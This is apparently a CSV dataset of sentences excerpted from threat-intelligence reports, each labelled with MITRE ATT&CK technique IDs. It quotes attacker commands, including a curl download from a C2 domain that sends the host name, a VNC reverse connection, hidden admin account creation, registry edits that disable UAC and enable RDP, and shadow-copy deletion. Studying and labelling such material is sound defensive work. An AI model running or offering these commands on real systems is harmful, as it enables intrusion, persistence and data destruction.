"After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.",T1090
Phase 4: SMOKEDHAM Dropper The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.,T1140
The SMOKEDHAM backdoor source code is embedded as an encrypted string.,T1027
The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.,T1140
"The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.",T1573.001
Figure 7 shows the deobfuscated SMOKEDHAM dropper.,T1140
"Figure 7: SMOKEDHAM dropper Phase 5: SMOKEDHAM Backdoor SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.","T1113, T1056.001"
The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.,T1105
SMOKEDHAM Network Communications SMOKEDHAM communicates with its C2 server using HTTPS.,T1071.001
The backdoor uses domain fronting to obfuscate its true C2 server.,T1090
The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.,T1090
The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.,T1071.001
SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.,"T1573.001, T1071.001"
"The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.",T1573.001
The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.,"T1573.001, T1140"
Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.,"T1573.001, T1140"
"SMOKEDHAM Commands SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.","T1573.001, T1140"
"The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1. Keyword Action delay Update its sleep interval screenshot Upload a screen capture to its C2 server via a subsequent HTTP POST request exit Terminate Table 1: Plaintext command data keywords If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.","T1041, T1113, T1071.001"
The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.,T1071.001
"In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",T1056.001
The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.,"T1041, T1056.001, T1071.001"
net.exe user net.exe users whoami.exe whoami.exe /priv systeminfo.exe,"T1033, T1082"
net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v,T1112
"The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.","T1021.001, T1112"
reg.exe ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t,T1112
REG_DWORD /d 0 /f reg.exe ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fSingleSessionPerUser /t,T1112
REG_DWORD /d 0 /f reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t,T1112
REG_DWORD /d,T1112
"1 /f Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential to enable credential caching.",T1112
"Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",T1105
APPDATA%\Chrome\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 –run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.,T1547.001
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ConhostNT /d,T1547.001
"%appdata%\Chrome\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",T1105
SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.,T1547.001
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindNT /d,T1547.001
C:\ProgramData\WindNT\VirtualHost.vbs Keylogger Deployment This attacker utilized an additional keylogging utility named C:\ProgramData\psh\console.exe.,T1056.001
The keylogging utility was configured to capture and record keystrokes to C:\ProgramData\psh\System32Log.txt.,T1056.001
Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.,"T1105, T1056.001"
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\console.lnk Cobalt Strike Beacon The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe.,T1105
The attacker executed C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe using Command Prompt.,T1059.003
Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ directory.,"T1105, T1547.001"
"Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload.",T1003.001
LSASS Dumping and Lateral Movement Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.,T1003.001
"DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\ProgramData\psh\ directory.",T1003.001
"From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections.",T1021.001
"Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory.","T1105, T1003.001, T1056.001"
"These hackers acted for both their own personal gain and the benefit of the Chinese MSS.[2] According to the indictment, To conceal the theft of information from victim networks and otherwise evade detection, the defendants typically packaged victim data in encrypted Roshal Archive Compressed files (RAR files), changed RAR file and victim documents’ names and extensions (e.g., from “.rar” to “.jpg”) and system timestamps, and concealed programs and documents at innocuous-seeming locations on victim networks and in victim networks’ “recycle bins.”",T1564.001
"This is a vulnerability in F5’s Big-IP Traffic Management User Interface that allows cyber threat actors to execute arbitrary system commands, create or delete files, disable services, and/or execute Java code.[7] CVE-2019-19781:","T1059.003, T1070.004"
CVE-2019-19781 enabled the actors to execute directory traversal attacks.[8] CVE-2019-11510:,T1083
"It contains a number of tools that complement the cyber threat actor’s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners.","T1055, T1056.001"
China Chopper contains security scanners and can be used to upload files and brute-force passwords.,T1110
Mimikatz CISA has observed the actors using Mimikatz during their operations.,T1003.001
T1190 Exploit Public-Facing Application CISA has observed the actors leveraging CVE-2019-19781 to compromise Citrix Application Delivery Controllers.,T1190
Credential Access Cyber threat actors also continue to identify large repositories of credentials that are available on the internet to enable brute-force attacks.,T1110
Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory CISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.,T1003.001
The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool.,T1003.001
"T1110.004 Brute Force: Credential Stuffing CISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server. Discovery As with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerable—there are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose.","T1190, T1110"
Command and Control CISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous.,T1090
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.,T1090
"For example, “The Onion Router” (Tor) is often used by cyber threat actors for anonymity and C2.",T1090
Actor’s carefully choose proxy tools depending on their intended use.,T1090
Table 11: Command and control techniques observed by CISA MITRE ID Name Observation T1090.002 Proxy: External Proxy CISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses.,T1090
Proxy CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.,"T1090, T1190"
T1573.002 Encrypted Channel: Asymmetric Cryptography CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.,T1190
"For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used.",T1566.001
The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.,T1566.001
"These payloads are compressed inside RAR files, this helps avoid static analysis techniques that do not decompress the files first.",T1027
The purpose of the payloads are to create persistence and download further malware payloads.,T1105
Malicious Microsoft Excel Files The Excel payloads simply contain an Equation Editor exploit that creates two different scheduled tasks.,T1053.005
"One scheduled task (shown below) runs every 15 minutes, to download a next stage EXE payload using cURL, also sending the actor the name of the infected machine.","T1105, T1053.005"
These tactics have been observed being used by Bitter APT in 2021/2022.,T1053.005
"""C:\Windows\System32\schtasks.exe"" /create /sc MINUTE /mo 15 /TN \Windows\DWM\DWMCORE /TR ""cmd /c start /min",T1053.005
"-O """"https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&ct=QT"""""" /f Figure 4: Scheduled task The second scheduled task created attempts to execute the payload downloaded by the other task: ""C:\Windows\System32\schtasks.exe"" /create /sc MINUTE /mo 20 /TN \Windows\DWM\DWMCORELIB /TR",T1053.005
"""%AppData%\dwmcor.exe"" /f CHM Files The more common payloads contained within the RAR files are Microsoft Compiled HTML Help (CHM) files.",T1027
"These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.","T1105, T1053.005"
The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.,T1053.005
The computer name and the username is also sent to the C2.,"T1041, T1033, T1053.005, T1082"
"""C:\Windows\System32\schtasks.exe"" /create /sc minute /mo 15 /tn",T1053.005
"Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer.","T1005, T1219, T1056.001"
"The second version of the CHM payload abstracts the same activity through an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.",T1027
Figure 6: Encoded PowerShell command in version 2 of the CHM files,"T1027, T1140"
The decoded command is the following: schtasks /create,"T1140, T1053.005"
/tn,T1053.005
WinSecurity /sc minute /mo 15 /tr,T1053.005
It is evident that the C2 controllers have been updated also as now only the computer name is sent to the C2 and not the username.,"T1041, T1082"
"However, the most common method by which threat actors obtain initial access to networks is through the use of compromised valid credential pairs (T1078) and session cookies (T1539), which are often harvested from a successful infostealer infection (T1555, T1083) and sold by specialized initial access brokers on dark web and special-access sources.",T1078
"These dark web shops and marketplaces specialize in the sale of compromised account credentials, remote desktop protocol (RDP) and secure shell (SSH) accesses, and infostealer malware logs that can be utilized to gain access to a victims network.",T1021.001
Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.,T1190
Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers or use brute force password attacks.,"T1190, T1110"
"Since ransomware will encrypt all files on a victim system and often will search for directories on the network (such as networked file shares) to also encrypt, moving highly sensitive customer data to a system with no internet access or access to the rest of the network will minimize ransomwares access to those files.",T1083
"Researchers analyzed these logs and created a detailed map of the adversary's tactics, techniques, and procedures (TTPs).The threat actor primarily focused on exploiting four different remote code execution (RCE) vulnerabilities to target web services and heavily relied on open-source tools, some of which are exclusively available in Chinese underground forums.",T1210
The threat actor also engaged in brute-forcing against the victim's internal web services.,T1110
"The server contained HTTP header data (SimpleHTTP/0.6 Python/3.8.10), indicating the use of a Python library called SIMPLEHTTPSERVER to serve the files and folders detailed in Figure 1. Figure 1 – Screenshot of exposed threat actor infrastructure showing available tools and target lists..",T1071.001
Converting domain name to IP address [3] Neo-reGeorg: Reverse proxy tool [4] Nuclei: Vulnerability scanner,T1090
[7] LaZagne: Recover stored passwords on a system [8] SharpCheckInfo: Situation awareness tool [9] HackBrowserData: Decrypting and exporting browser data [10] FRP: Reverse proxy tool,"T1090, T1140"
Figure 4 – Completed reconnaissance and vulnerability scans.,T1190
Initial Compromise Through Exploiting Publicly Facing Applications,T1190
"Based on evidence obtained from the bash history data, EclecticIQ researchers observed that the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:• CVE-2023-21839 Oracle WebLogic Server RCE",T1190
[13]• CVE-2021-3129 Laravel debug mode RCE,T1190
[14]• CVE-2020-2551 Oracle WebLogic RCE,T1190
[15]• CVE-2021-44228 Apache Log4j,T1190
[16] Figure 5 – BASH history logs of from the threat actor’s system showing exploitation of CVE-2020-2551.,T1190
"Cobalt Strike Cat was initially shared on a Chinese-speaking cybersecurity forum called t00ls[.]com, with a link to a GitHub repository and was distributed inside an encrypted ZIP folder.",T1027
Only registered users of t00ls[.]com could obtain the decryption key for the ZIP folder and access the tool.,T1140
"The attacker then changed the Cobalt Strike Cat beaconing frequency for behaviour-based evasion by sending the ""sleep 10"" command to the infected host and executed the ""tasklist /SVC"" command to list all running processes on the victim device.",T1057
Analysis showed that the victim IP address was publicly serving a web service that contained a phpMyAdmin database.,T1190
The database used a weak password and was susceptible to brute-force attacks.,T1110
These attempts are primarily performed with an open-source automated vulnerability scanning and brute forcing tool called FSCAN.,T1110
EclecticIQ researchers observed that the threat actor used the Windows command-line arguments to perform general reconnaissance against infected devices.,T1059.003
"""DBPath"" *.* Used to search for the string ""DBPath"" in all files within the current directory and its subdirectories. arp –a Address resolutions for remote systems. netsh wlan show profiles Display a list of all the wireless network profiles.",T1083
dir %APPDATA%\Microsoft\Windows\Recent List of recently opened files and folders on the computer.,T1083
Escalate Privileges with Stolen Credentials The threat actor uses stolen passwords from valid accounts as the primary vector for privilege escalation.,T1078
These passwords would allow the threat actor to escalate privileges using valid accounts if the accounts were privileged .,T1078
The Cobalt Strike Cat beacon logs (Figure 12) show that the actor uploaded LaZagne onto the infected device for credential harvesting purposes and deleted the LaZagne binary after execution to avoid detection from the user's side.,T1070.004
The actor leveraged ONE-FOX - a collection of pentest tools - to copy binaries from actor´s system to the victim. Figure 12 – Threat actor successfully obtained user account credentials in NTLM format.,T1570
Figure 13 – Execution of Hack-browser-data on infected host.,T1543.003
"Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.",T1543.003
"Windows services ran with the highest privilege, NT AUTHORITY\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.","T1569.002, T1543.003"
"Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\Windows\Temp\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called “windowsupdate”.","T1543.003, T1569.002"
This service executes a malicious binary (Cobalt Strike Cat payload) under “C:\Windows\Temp\svchost.exe” every time the victim device is started.,T1569.002
Figure 14 – Installation of malicious Windows service.,T1543.003
"Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.",T1090
"This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.","T1090, T1110"
"Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\Windows\Temp"" file path and then executed it on victim machine.",T1090
Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.,T1090
FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.]194) over port 2333.,T1059.003
Figure 15 – Execution of FRP reverse SOCKS proxy on infected host.,T1090
"After establishing the reverse SOCKS proxy connection, the threat actor performed internal reconnaissance and brute forcing attempts on some of the internal FTP servers inside victim network. Victimology and Targeting Patterns EclecticIQ researchers assess with moderate confidence that the primary targets of the threat actor are Taiwanese government entities and organizations in the critical infrastructures sector.","T1090, T1110"
EclecticIQ researchers observed that the threat actor used private proxy addresses from a Chinese underground proxy IP solution called 'Tigercloud Club' to conceal their real IP address.,T1090
Mitigation and Prevention Strategies One of the main initial access vector is exploitation of publicly exposed web services.,T1190
The threat actor installed a second stage persistence backdoor on infected device by abusing Windows Services.,T1543.003
"Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities: Taking full control of the infected machine Recording keystrokes in real time with offline logging available Accessing live web cam feeds including microphone recording Downloading files remotely Remote shutdown and reboot Disabling user input Over Gh0st RAT’s long life, Chinese nation-state threat actors have used it to breach high-value targets such as governments, embassies, economic targets, and media.","T1105, T1056.001"
"Utilizing I2P, the dropper then downloads a custom XMRig miner and orchestrates the mining operations.",T1105
The malicious dropper contains a legitimate version of the software and executes it to give the illusion of a properly behaving application.,T1036.005
Legitimate Application Dropper Script,T1036.005
"In order to appear as a working copy of Logic Pro X, the dropper contains a legitimate copy of the lure application.",T1036.005
The dropper starts by generating a script to decode the legitimate Mach-O file.,T1140
The mirrored bundle contains the legitimate application instead of the dropper binary.,T1036.005
The script removes any files that conflict with its randomly generated paths.,T1070.004
It creates symbolic links in the /tmp/ bundle to mirror all directories found in /Applications/Logic Pro X.app/Contents and /Applications/Logic Pro X.app/Contents/MacOS to their respective /tmp/ locations.,T1036.005
The Logic Pro X dropper binary is deleted with the /tmp/ bundle.,T1027
"In order to unpack the legitimate binary, the previously written Base64 file is decoded and unarchived.","T1027, T1140"
The dropper binary unpacks a customized Mach-O compiled from the open source i2pd (I2P Daemon) project.,T1027
I2P is configured and used by the dropper to download the mining tooling but also to proxy the miner’s network communications.,T1090
The script is executed as a /bin/sh subprocess.,T1070.004
The script first deletes itself from the disk.,T1070.004
This value is decoded and the output is written to an additional file (/tmp/._[a-zA-Z]{8}).,T1140
The script pads the resulting Mach-O with a random number of \x00 bytes.,T1027
"The padded i2pd Mach-O file is executed via a call to exec -a ""/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/N/Support/mdworker_shared"" ""$0"" Note that $0 will resolve the first argument of the current process.",T1027
"After the process executes, the I2P dropper script removes the i2pd Mach-O file from the disk.",T1070.004
Public i2pd binaries rely on config files or command line arguments for necessary configuration of tunnels and upstream connections.,T1059.003
"The dropper generates and executes a script to download, configure and execute a copy of a XMRig miner.",T1105
The script is executed as a command line argument passed into a /bin/sh -c,T1059.003
The script then removes any files that conflict with its randomly generated paths.,T1070.004
"The script then enters a download loop that contains two subloops, one to download the MD5 hash of the XMRig payload, and a second to download the XMRig payload.",T1105
"During this loop, the script implements a check using pgrep for Activity Monitor processes in an attempt to evade user detection.",T1518.001
This second subloop performs the same actions but instead pulls the XMRig payload from http://127.0.0[.]1:4445/update.,T1105
"The XMRig payload is then extracted from the download via tar, and the resulting Mach-O file is padded with a random number of \x00 bytes.",T1027
"Similar to the ip2d process, it is executed via an exec -a call utilizing a process name of /System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/N/Support/mdworker_local Next, the XMRig Download Script sends the XMRig miner a config via the XMRig miner’s native API.",T1106
The existence of a donate-over-proxy value and the usage of generic user and password values within the XMRig configuration reveal the usage of a mining proxy.,T1090
The usage of a proxy allows authors to control all of their mining implants and their target pools via a centralized console.,T1090
This proxy server is located on the I2P network at the destination of the pool tunnel.,T1090
"With the observed configuration, it will utilize the I2P network and the mining proxy to perform CPU mining operations on the host.",T1090
Defense Evasion The dropper binary and its scripts utilize a number of techniques to avoid detection.,T1036.005
"The dropper bundle in the applications folder appears legitimate, and this bundle houses all of the Logic Pro X dependencies/frameworks.",T1036.005
The authors cleverly utilized these legitimate dependencies via symbolic links when dynamically creating the legitimate bundle in the temp folder.,"T1036.005, T1070.004"
"Even though the scripts produce many on-disk artifacts, the dropper and scripts are quick to remove them as soon as they are executed or used.",T1070.004
The i2pd and XMRig binaries are padded with a random number of zero bytes to change its hash and expand its size.,T1027
"The mining infrastructure is dropped, downloaded and deleted every time the dropper executes.",T1070.004
"As long as the dropper successfully launches its legitimate application, the user will continue to execute the dropper under the assumption that it is legitimate.","T1204.002, T1036.005"
User Execution (T1204),T1204.002
The dropper is executed by the user.,T1204.002
Defense Evasion Deobfuscate/Decode Files or Information (T1140) Files are dropped/downloaded as Base64-encoded archives.,T1027
Indicator Removal: File Deletion (T1070.004),T1070.004
Files are deleted after use.,T1070.004
Masquerading: Match Legitimate Name or Location (T1036.005),T1036.005
"The dropper is installed into a legitimate file path, posing as the legitimate application. i2pd and XMRig also utilize legitimate file paths to mask their execution.",T1036.005
"These settings include specifying the size of large files where partial encryption is applied instead of encrypting the entire file, defining the primary path for encryption, specifying file paths to skip during encryption, targeting specific services and processes, configuring autorun entries, enabling auto ransom note opening, and even changing wallpapers on infected systems.",T1547.001
"Figure 3 – File details Upon execution, the ransomware first creates a mutex named “Global\\{5d202e6e-b33a-4833-abfb-2391bc075089}” to ensure that only a single instance of the malware is running on the victim’s system.",T1548.002
"UAC BYPASS After creating the mutex, the ransomware modifies specific registry values to disable User Access Control (UAC), a security feature in Windows.","T1112, T1548.002"
"By deactivating UAC, the ransomware gets elevated privileges without requiring user permission or administrator credentials.",T1548.002
"EnableLUA By modifying the below registry value EnableLUA to “0”, malware aims to deactivate User Account Control (UAC) on the target system.","T1548.002, T1112"
"Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA = “0” ConsentPromptBehaviorAdmin The ConsentPromptBehaviorAdmin key has been set to “0”, indicating that the behavior of the consent prompt for actions requiring administrator privileges has been modified.",T1112
"Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin = “0” Kill Processes/Services After bypassing UAC, the ransomware terminates several processes, including 360doctor, GDscan, RTVscan, Apache, CCleaner, OneDrive, and others, if they are currently running on the victim’s machine.",T1548.002
"Figure 5 – List of Services to Stop Prior to encrypting the files, the ransomware uses the FindFirstVolumeW() and FindNextVolumeW() API functions to search and identify accessible volumes on the targeted system.","T1083, T1106"
"Once the ransom note has been dropped, the malware proceeds to identify files and directories for encryption by iterating through them using the FindFirstFileW() and FindNextFileW() API functions.","T1083, T1106"
"Within these libraries, the malware leverages various functions from the CryptoAPI, including CryptAcquireContextW(), CryptImportKey(), CryptSetKeyParam(), and CryptEncrypt().",T1106
"Figure 7 – File Encryption In the next step, the malware renames the encrypted files with the extension “.CCBDFHCHFD” and replaces them with the original files using the MoveFileExW() API function, as shown below.",T1106
CommandsDescriptionwmic SHADOWCOPY DELETE /nointeractiveThis command uses the Windows Management Instrumentation Command-line (WMIC) to delete all shadow copies without user interaction.,T1047
"Its primary purpose is to carry out the encryption process on the victim’s Linux machine by scanning files in a specified or generic path and running the ransomware payload, “164f8295_linux.elf”, on each file it encounters.",T1083
EmptyTrash() – This function is responsible for deleting all files and directories in the user’s trash folder.,T1070.004
"This function executes the ransomware payload file “164f8295_linux.elf”, by passing the file path to be encrypted as an argument.",T1027
ScanPath(): This function scans a specified path by finding all files within the given directory and its subdirectories.,T1083
Cleanup() – This function performs cleanup operations after encrypting files in the victim’s machine.,T1027
It removes log files and temporary files from the root directory.,T1027
"It also deletes the ransomware, script file, and ransom note (index.html), ensuring that no evidence remains on the compromised system.",T1027
It uses the esxcli command to list all VM processes and forcibly kills them.,T1057
It retrieves the list of NFS volumes using esxcli and then iterates over each volume to find files.,T1083
ScanVMS() – This function scans VM volumes on an ESXi server.,T1083
It retrieves the list of VM volumes using the esxcli command and then iterates over each volume to search for specific files related to virtual machines.,T1083
"This may increase the likelihood that the initial entry point for wave 2 is through legitimate remote access software such as AnyDesk, especially since we know that the wave 2 wiper modifications included automatic execution upon driver installation only – potential need for urgency due to the limited time/access window.",T1219
"Nevertheless, the intrusion analysis conducted on one of the affected machines indicates that in wave 2 the threat actor did not use a BAT file to invoke the ransomware while supplying seven digits similar to wave 1, but instead invoked the wave 2 ransomware immediately from the command line using six zeroes: “000000”.",T1059.003
"When comparing wave 2 ransomware samples to wave 1, we notice that both have the same , and both use CreateFile and WriteFile APIs to overwrite files.",T1106
"During the process of execution, wave 2 ransomware attempts to decrypt and execute embedded scripts, malware settings or API function names.","T1027, T1140"
"However, the RC4 key for decryption in wave 2 has been changed in another attempt to evade detection.",T1140
"Wave 1 RC4 key: 8C E4 B1 6B 22 B5 88 94 AA 86 C4 21 E8 75 9D F3 Wave 2 RC4 key: F0 B4 ED D9 43 F5 C8 43 C9 D0 A2 4F 22 9B BC 3A It’s worth noting that in both waves, the RC4 decryption method uses CryptoAPI (CryptDecrypt) instead of the usual substitution box method.",T1140
"The three main changes are: Modified malware signing Embedding of EldoS RawDisk driver inside the wiper malware Automatic wiping after driver installation command Historically, in ZEROCLEARE and DUSTMAN incidents from 2019, the wiper malware and raw disk drivers were not signed and therefore could not directly access the raw disk for speedy data wiping.",T1027
"So, the wipers had to use a third-party loader such as TDL – a signed loader for unsigned drivers – to install the unsigned raw disk driver that allows the wiper malware to directly access the raw disk for wiping data using DeviceControl API methods.",T1106
"Conversely, in wave 2 the threat actor embedded the signed raw disk driver in the wiper executable, dropped it and then installed it.",T1027
"Finally, for the most part, wave 1 and wave 2 wipers remained the same, including the reliance on the same authentication key to access the raw disk driver, and the use of the same DeviceControl API methods, but with one exception, as shown below.",T1106
"Wave 1 wiper DeviceControl API methods: IOCTL_DISK_GET_DRIVE_GEOMETRY_EX IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Wave 2 wiper DeviceControl API methods: IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS (new method in wave 2; used in multiple instances) IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Based on our telemetry, we suspect the infections are associated with law enforcement institutions in Albania.",T1106
"In wave 2, the raw disk driver was embedded inside the malware and the wiping routine started immediately after driver installation, as opposed to the wave 1 procedure.",T1027
"The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet.",T1204.002
"We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable.",T1059.003
"The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script.",T1059.003
"For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.",T1105
"Novel infection chain Long-lasting initial infection Based on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document.",T1566.001
"Upon launch, the malicious document connects to the remote server and downloads the payload.",T1105
"In this particular case, the executable ieinstal.exe was used to bypass UAC.",T1548.002
"Through the implanted backdoor, they attempted to fingerprint the victim and install additional malware with high privileges.",T1105
"Upon infection, the operator executed several Windows commands to gather basic system information.","T1059.003, T1082"
They then returned 18 hours later to install further malware with high privileges.,T1105
"Post-exploitation Based on our telemetry, when the malicious Word document opens it fetches the next payload from the remote server: Download URL: http://avid.lno-prima[.]lol/VcIf1hLJopY/shU_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI= The fetched payload is supposed to be saved in %Profile%\update.dll.",T1105
"rundll32.exe %Profile%\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ== Command #2:",T1218.011
This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy document’s password.,T1204.002
"The main difference from the previous shortcut sample was that it fetched an additional script payload (Visual Basic Script or HTML Application); also, a different method of fetching and executing the next stage payload was adopted at this time.",T1105
The command below was executed when the victim double-clicked on the shortcut file:cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\Pass.txt & start %APPDATA%\Pass.txt && FOR %i IN (%systemroot%\system32\msiexec.*),"T1059.003, T1204.002"
"The NTFS file system marks a file downloaded from the internet, and Windows handles the file in a safe way.",T1105
This ISO image file contains one PowerPoint slide show and one Visual Basic Script.,T1027
Embedded files of ISO image The Microsoft PowerPoint file contains a link.,T1027
"The virtual disk file contains a decoy PDF file, Windows executable file, and an encrypted Dump.bin file.",T1027
The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions.,T1027
"The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.",T1140
"The decrypted data is the header of a PE file, overwriting the recovered header to the original file.",T1140
"Eventually, it loads the decrypted DLL file by spawning the ordinary first export function.",T1140
The spawned downloader contains an encrypted configuration at the end of the file.,T1027
The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.,T1140
Infection flow of downloader This downloader checks for the names of the following antivirus vendors:,T1518.001
"Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.",T1518.001
"If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library.",T1518.001
This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.,T1027
"With this trick, the malware can disable the functionalities of EDR/AV products.",T1562.001
The decoy document masquerades as a job offer from a Japanese multinational bank.,T1518.001
"If Windows Defender or Bitdefender Antivirus is installed on the victim’s computer, the malware executes itself with the following commands: Windows Defender: cmd /c","T1059.003, T1518.001"
-h \”[PDF decoy file]\” & rundll32 \”[current DLL file path]\” #1 Bitdefender: cmd /c,T1059.003
timeout /t 10 & rundll32 \”[current DLL file path]\” #1 The primary objective of this malware is to fetch the next stage payload.,T1105
"To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed. Avira or Avast installed:",T1518.001
"If the fetched data by cURL command contains “<html>” and “curl:”, the malware decrypts the payload with a delivered 64-byte RC4 key.","T1105, T1140"
